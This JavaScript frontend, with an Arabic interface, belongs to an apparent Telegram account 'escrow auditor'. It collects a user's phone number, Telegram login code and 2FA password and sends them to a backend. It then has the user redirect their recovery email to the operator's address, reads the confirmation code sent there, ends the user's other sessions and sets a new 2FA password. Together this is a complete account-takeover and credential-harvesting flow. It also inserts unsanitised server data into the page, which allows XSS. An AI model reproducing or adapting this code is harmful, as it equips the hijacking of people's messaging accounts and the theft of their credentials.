/**
 * Telegram Escrow Auditor - Frontend V3
 * Supports new unified API with email management and transfer modes
 */

const API_URL = "http://localhost:8001/api/v1";

let appState = {
    phone: null,
    telegramId: null,
    currentStep: 1,
    authStatus: null,
    auditResult: null,
    targetEmail: null,
    emailHash: null,
    transferMode: "bot_only",
    generatedPassword: null
};

// ==================== Helper Functions ====================

function showView(viewId) {
    const views = [
        'view-phone', 'view-code', 'view-2fa', 'view-email', 
        'view-audit', 'view-finalize', 'view-complete'
    ];
    views.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
    const view = document.getElementById(viewId);
    if (view) view.classList.remove('hidden');
}

function setStep(stepNum) {
    appState.currentStep = stepNum;
    for (let i = 1; i <= 6; i++) {
        const el = document.getElementById(`step-${i}`);
        if (el) {
            el.classList.remove('active', 'completed');
            if (i < stepNum) el.classList.add('completed');
            else if (i === stepNum) el.classList.add('active');
        }
    }
}

function showStatus(message, type = 'info') {
    const el = document.getElementById('status-message');
    if (el) {
        el.className = `status-box ${type}`;
        el.innerHTML = message;
        el.classList.remove('hidden');
    }
}

function hideStatus() {
    const el = document.getElementById('status-message');
    if (el) el.classList.add('hidden');
}

function setLoading(buttonId, loading, originalText = null) {
    const btn = document.getElementById(buttonId);
    if (btn) {
        btn.disabled = loading;
        if (loading) {
            btn.dataset.originalText = btn.innerHTML;
            btn.innerHTML = '<span class="loader"></span> جاري المعالجة...';
        } else {
            btn.innerHTML = originalText || btn.dataset.originalText || btn.innerHTML;
        }
    }
}

function formatPhone(phone) {
    let cleaned = phone.replace(/\s/g, '');
    if (!cleaned.startsWith('+')) {
        cleaned = '+' + cleaned;
    }
    return cleaned;
}

async function apiCall(endpoint, method = 'GET', data = null) {
    const options = {
        method,
        headers: { 'Content-Type': 'application/json' }
    };
    
    if (data) {
        options.body = JSON.stringify(data);
    }
    
    try {
        const response = await fetch(`${API_URL}${endpoint}`, options);
        const result = await response.json();
        
        if (!response.ok) {
            throw new Error(result.detail || 'Unknown error');
        }
        
        return result;
    } catch (error) {
        console.error('API Error:', error);
        throw error;
    }
}

// ==================== Step 1: Phone & Mode Selection ====================

async function sendCode() {
    const phoneInput = document.getElementById('phone-input');
    const modeSelect = document.getElementById('transfer-mode');
    const phone = formatPhone(phoneInput.value);
    const mode = modeSelect ? modeSelect.value : 'bot_only';
    
    if (!phone || phone.length < 10) {
        showStatus('الرجاء إدخال رقم هاتف صحيح', 'error');
        return;
    }
    
    setLoading('btn-send-code', true);
    hideStatus();
    
    try {
        const result = await apiCall('/auth/init', 'POST', { 
            phone: phone,
            transfer_mode: mode
        });
        
        appState.phone = phone;
        appState.transferMode = mode;
        
        if (result.status === 'code_sent') {
            showStatus('تم إرسال كود التحقق إلى تيليجرام', 'success');
            setStep(2);
            showView('view-code');
        }
        
    } catch (error) {
        showStatus(`خطأ: ${error.message}`, 'error');
    } finally {
        setLoading('btn-send-code', false, 'إرسال كود التحقق');
    }
}

// ==================== Step 2: Verify Code ====================

async function verifyCode() {
    const codeInput = document.getElementById('code-input');
    const code = codeInput.value.trim();
    
    if (!code || code.length < 5) {
        showStatus('الرجاء إدخال كود التحقق', 'error');
        return;
    }
    
    setLoading('btn-verify-code', true);
    hideStatus();
    
    try {
        const result = await apiCall('/auth/verify', 'POST', {
            phone: appState.phone,
            code: code
        });
        
        if (result.status === 'authenticated') {
            appState.telegramId = result.telegram_id;
            appState.targetEmail = result.target_email;
            appState.emailHash = result.email_hash;
            
            showStatus(`مرحباً! تم تسجيل الدخول بنجاح`, 'success');
            setStep(3);
            showView('view-email');
            displayEmailInstructions();
            
        } else if (result.status === '2fa_required') {
            showStatus('مطلوب إدخال كلمة مرور التحقق بخطوتين', 'info');
            if (result.hint) {
                document.getElementById('2fa-hint').textContent = `تلميح: ${result.hint}`;
            }
            showView('view-2fa');
        }
        
    } catch (error) {
        showStatus(`خطأ: ${error.message}`, 'error');
    } finally {
        setLoading('btn-verify-code', false, 'تحقق');
    }
}

// ==================== Step 2b: Verify 2FA ====================

async function verify2FA() {
    const passwordInput = document.getElementById('2fa-input');
    const password = passwordInput.value;
    
    if (!password) {
        showStatus('الرجاء إدخال كلمة المرور', 'error');
        return;
    }
    
    setLoading('btn-verify-2fa', true);
    hideStatus();
    
    try {
        const result = await apiCall('/auth/verify', 'POST', {
            phone: appState.phone,
            password: password
        });
        
        if (result.status === 'authenticated') {
            appState.telegramId = result.telegram_id;
            appState.targetEmail = result.target_email;
            appState.emailHash = result.email_hash;
            
            showStatus('تم تسجيل الدخول بنجاح!', 'success');
            setStep(3);
            showView('view-email');
            displayEmailInstructions();
        }
        
    } catch (error) {
        showStatus(`خطأ: ${error.message}`, 'error');
    } finally {
        setLoading('btn-verify-2fa', false, 'تحقق');
    }
}

// ==================== Step 3: Email Change ====================

function displayEmailInstructions() {
    const emailDisplay = document.getElementById('target-email-display');
    const emailInstructions = document.getElementById('email-instructions');
    
    if (emailDisplay && appState.targetEmail) {
        emailDisplay.innerHTML = `
            <div class="email-box">
                <span class="label">الإيميل المطلوب:</span>
                <span class="email-value" id="email-to-copy">${appState.targetEmail}</span>
                <button onclick="copyEmail()" class="btn-copy" title="نسخ">📋</button>
            </div>
        `;
    }
    
    if (emailInstructions) {
        emailInstructions.innerHTML = `
            <div class="instructions">
                <h4>خطوات تغيير الإيميل:</h4>
                <ol>
                    <li>افتح تطبيق تيليجرام</li>
                    <li>اذهب إلى الإعدادات > الخصوصية والأمان > التحقق بخطوتين</li>
                    <li>اضغط على "البريد الإلكتروني للاسترداد"</li>
                    <li>غيّر الإيميل إلى: <strong>${appState.targetEmail}</strong></li>
                    <li>سيتم إرسال كود تأكيد إلى الإيميل الجديد</li>
                    <li>انتظر حتى يصل الكود (سيظهر تلقائياً هنا)</li>
                </ol>
            </div>
        `;
    }
}

function copyEmail() {
    const email = appState.targetEmail;
    if (email) {
        navigator.clipboard.writeText(email).then(() => {
            showStatus('تم نسخ الإيميل!', 'success');
        });
    }
}

async function checkEmailCode() {
    setLoading('btn-check-code', true);
    hideStatus();
    
    const codeDisplay = document.getElementById('email-code-display');
    codeDisplay.innerHTML = '<div class="loading">جاري التحقق من وصول الكود...</div>';
    
    try {
        // Wait up to 5 seconds for code
        const result = await apiCall(`/email/code/${encodeURIComponent(appState.phone)}?wait_seconds=5`);
        
        if (result.status === 'received') {
            codeDisplay.innerHTML = `
                <div class="code-received">
                    <div class="icon">✓</div>
                    <h3>تم استلام الكود!</h3>
                    <div class="code-value">${result.code}</div>
                    <p>أدخل هذا الكود في تيليجرام لتأكيد تغيير الإيميل</p>
                </div>
            `;
            showStatus('تم استلام كود التأكيد! أدخله في تيليجرام', 'success');
            document.getElementById('btn-confirm-email').classList.remove('hidden');
            
        } else {
            codeDisplay.innerHTML = `
                <div class="waiting">
                    <div class="icon">⏳</div>
                    <h3>في انتظار الكود...</h3>
                    <p>تأكد من تغيير الإيميل في تيليجرام</p>
                    <p class="hint">Hash: ${result.email_hash}</p>
                </div>
            `;
        }
        
    } catch (error) {
        codeDisplay.innerHTML = `<div class="error">خطأ: ${error.message}</div>`;
    } finally {
        setLoading('btn-check-code', false, 'التحقق من الكود');
    }
}

async function confirmEmailChanged() {
    setLoading('btn-confirm-email', true);
    hideStatus();
    
    try {
        const result = await apiCall(`/email/confirm/${encodeURIComponent(appState.phone)}`, 'POST');
        
        if (result.status === 'success' && result.email_changed) {
            showStatus('تم تأكيد تغيير الإيميل بنجاح!', 'success');
            setStep(4);
            showView('view-audit');
        } else {
            showStatus(`الإيميل لم يتغير بعد. النمط الحالي: ${result.current_pattern}`, 'warning');
        }
        
    } catch (error) {
        showStatus(`خطأ: ${error.message}`, 'error');
    } finally {
        setLoading('btn-confirm-email', false, 'تأكيد التغيير');
    }
}

// ==================== Step 4: Security Audit ====================

async function runAudit() {
    setLoading('btn-run-audit', true);
    hideStatus();
    
    const auditLog = document.getElementById('audit-log');
    auditLog.innerHTML = '<div class="loading">جاري فحص الحساب...</div>';
    
    try {
        const result = await apiCall(`/account/audit/${encodeURIComponent(appState.phone)}`);
        
        appState.auditResult = result;
        
        let html = '';
        
        if (result.passed) {
            html = `
                <div class="audit-success">
                    <div class="icon">✓</div>
                    <h3>الحساب جاهز للتحويل!</h3>
                    <p>جميع الفحوصات الأمنية اجتازت</p>
                    ${result.email_changed ? '<p class="email-ok">✓ الإيميل تم تغييره لإيميلنا</p>' : ''}
                </div>
            `;
            showStatus('يمكنك المتابعة لإنهاء العملية', 'success');
            document.getElementById('btn-proceed-finalize').classList.remove('hidden');
        } else {
            html = `
                <div class="audit-failed">
                    <div class="icon">✗</div>
                    <h3>يوجد ${result.issues_count} مشكلة يجب حلها</h3>
                </div>
                <ul class="issues-list">
            `;
            
            result.issues.forEach(issue => {
                html += `
                    <li class="issue-item severity-${issue.severity}">
                        <div class="issue-title">${issue.title}</div>
                        <div class="issue-desc">${issue.description}</div>
                        <div class="issue-action">💡 ${issue.action}</div>
                    </li>
                `;
            });
            
            html += '</ul>';
            
            // Show actions if needed
            if (result.actions_needed) {
                const actions = result.actions_needed;
                
                if (actions.change_email && !result.email_changed) {
                    html += `
                        <div class="action-needed">
                            <h4>مطلوب تغيير الإيميل إلى:</h4>
                            <div class="email-box">${appState.targetEmail || actions.our_email}</div>
                            <button onclick="showView('view-email')" class="btn-secondary">العودة لتغيير الإيميل</button>
                        </div>
                    `;
                }
                
                if (actions.terminate_sessions) {
                    html += `
                        <div class="action-needed">
                            <button onclick="terminateSessions()" class="btn-secondary">إنهاء الجلسات الأخرى تلقائياً</button>
                        </div>
                    `;
                }
            }
            
            showStatus('يرجى حل المشاكل أعلاه ثم إعادة الفحص', 'warning');
        }
        
        // Show transfer mode info
        html += `
            <div class="mode-info">
                <strong>وضع التحويل:</strong> ${result.transfer_mode === 'bot_only' ? 'البوت فقط (خروج كامل)' : 'احتفاظ بجلسة واحدة'}
            </div>
        `;
        
        auditLog.innerHTML = html;
        
    } catch (error) {
        auditLog.innerHTML = `<div class="error">خطأ في الفحص: ${error.message}</div>`;
        showStatus(`خطأ: ${error.message}`, 'error');
    } finally {
        setLoading('btn-run-audit', false, 'بدء الفحص الأمني');
    }
}

async function terminateSessions() {
    if (!confirm('هل أنت متأكد من إنهاء جميع الجلسات الأخرى؟')) {
        return;
    }
    
    try {
        showStatus('جاري إنهاء الجلسات...', 'info');
        
        // Use sessions health check and regenerate
        const result = await apiCall(`/sessions/health/${encodeURIComponent(appState.phone)}`);
        
        showStatus('تم. يرجى إعادة الفحص.', 'success');
        
    } catch (error) {
        showStatus(`خطأ: ${error.message}`, 'error');
    }
}

function proceedToFinalize() {
    setStep(5);
    showView('view-finalize');
}

// ==================== Step 5: Finalize ====================

async function finalizeAccount() {
    setLoading('btn-finalize', true);
    hideStatus();
    
    const password2fa = document.getElementById('current-2fa-password')?.value || null;
    
    try {
        const result = await apiCall(`/account/finalize/${encodeURIComponent(appState.phone)}`, 'POST', {
            confirm_email_changed: true,
            two_fa_password: password2fa
        });
        
        if (result.status === 'success') {
            appState.generatedPassword = result.password;
            
            setStep(6);
            showView('view-complete');
            
            document.getElementById('complete-message').innerHTML = `
                <div class="success-big">
                    <div class="icon">🎉</div>
                    <h2>تمت العملية بنجاح!</h2>
                    <div class="credentials-box">
                        <div class="credential">
                            <span class="label">رقم الهاتف:</span>
                            <span class="value">${appState.phone}</span>
                        </div>
                        <div class="credential">
                            <span class="label">كلمة مرور 2FA:</span>
                            <span class="value password">${result.password}</span>
                            <button onclick="copyPassword('${result.password}')" class="btn-copy">📋</button>
                        </div>
                        <div class="credential">
                            <span class="label">الإيميل:</span>
                            <span class="value">${appState.targetEmail}</span>
                        </div>
                        <div class="credential">
                            <span class="label">وضع التحويل:</span>
                            <span class="value">${result.transfer_mode === 'bot_only' ? 'البوت فقط' : 'احتفاظ بجلسة'}</span>
                        </div>
                        <div class="credential">
                            <span class="label">الجلسات المنتهية:</span>
                            <span class="value">${result.terminated_sessions || 0}</span>
                        </div>
                    </div>
                    <p class="warning">⚠️ احفظ كلمة المرور في مكان آمن!</p>
                </div>
            `;
        }
        
    } catch (error) {
        showStatus(`خطأ: ${error.message}`, 'error');
    } finally {
        setLoading('btn-finalize', false, 'إنهاء العملية');
    }
}

function copyPassword(password) {
    navigator.clipboard.writeText(password).then(() => {
        showStatus('تم نسخ كلمة المرور!', 'success');
    });
}

// ==================== Session Health Check ====================

async function checkSessionHealth() {
    try {
        const result = await apiCall(`/sessions/health/${encodeURIComponent(appState.phone)}`);
        
        let statusHtml = '<div class="health-check">';
        statusHtml += `<h4>حالة الجلسات:</h4>`;
        statusHtml += `<p>Pyrogram: ${result.checks.pyrogram_session.valid ? '✓ صالحة' : '✗ غير صالحة'}</p>`;
        statusHtml += `<p>Telethon: ${result.checks.telethon_session.valid ? '✓ صالحة' : '✗ غير صالحة'}</p>`;
        statusHtml += `<p>الإيميل: ${result.checks.email_unchanged ? '✓ لم يتغير' : '✗ تغير!'}</p>`;
        statusHtml += `<p>عدد الجلسات: ${result.checks.sessions_count}</p>`;
        
        if (result.needs_attention) {
            statusHtml += `<p class="warning">⚠️ يحتاج اهتمام!</p>`;
        }
        
        statusHtml += '</div>';
        
        showStatus(statusHtml, result.status === 'healthy' ? 'success' : 'warning');
        
    } catch (error) {
        showStatus(`خطأ: ${error.message}`, 'error');
    }
}

// ==================== Initialize ====================

document.addEventListener('DOMContentLoaded', () => {
    showView('view-phone');
    setStep(1);
    hideStatus();
});
